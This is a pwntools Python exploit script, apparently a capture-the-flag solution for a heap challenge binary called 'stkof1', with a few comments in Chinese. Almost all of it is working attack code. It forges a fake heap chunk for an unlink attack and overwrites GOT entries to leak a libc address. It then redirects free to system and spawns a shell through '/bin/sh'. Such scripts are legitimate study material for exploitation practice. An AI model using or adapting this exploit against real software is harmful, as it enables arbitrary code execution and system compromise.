#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./stkof1')
libc = ELF('libc.so.6')
p=process('./stkof1')

def create(size):
    p.sendline('1')
    p.sendline(str(size))

def edit(index, size, payload):
    p.sendline('2')
    p.sendline(str(index))
    p.sendline(str(size))
    p.sendline(payload)

def delete(index):
    p.sendline('3')
    p.sendline(str(index))

def show(index):
    p.sendline('4')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

create(0x20)# 1
# 这题中间有个 size 为 0x410 的 chunk 真jb烦，所以 unlink chunk1 有点不方便 我们选择 unlink chunk2
create(0x20)# 2 没进 fastbin 或者 tcache 才能 unlink
create(0x80)# 3
create(0x80)# 4 防止 free 3,3 直接进 top chunk

ptr = 0x602150
fd = ptr-0x18
bk = ptr-0x10
fake_chunk = flat(
    'a'*8, 0x20,
    fd, bk,
    0x20,0x90
)
edit(2,len(fake_chunk),fake_chunk)

delete(3)


puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']
payload = flat(
    0,
    free_got,
    puts_got,

)
edit(2,len(payload),payload)

payload = p64(puts_plt)
edit(0,len(payload),payload)


delete(1)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))
libc.address = puts_addr-libc.sym['puts']
log.success('libc.address: ' + hex(libc.address))
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))
binsh_addr = next(libc.search(b'/bin/sh'))
log.success('binsh_addr: ' + hex(binsh_addr))


payload = p64(system_addr)
edit(0,len(payload),payload)

payload = b'/bin/sh\x00'
edit(4,len(payload),payload)


delete(4)

# payload = flat(
#     0,
#     p64(binsh_addr)
# )
# edit(2,len(payload),payload)
#
# debug()
# delete(0)

p.interactive()
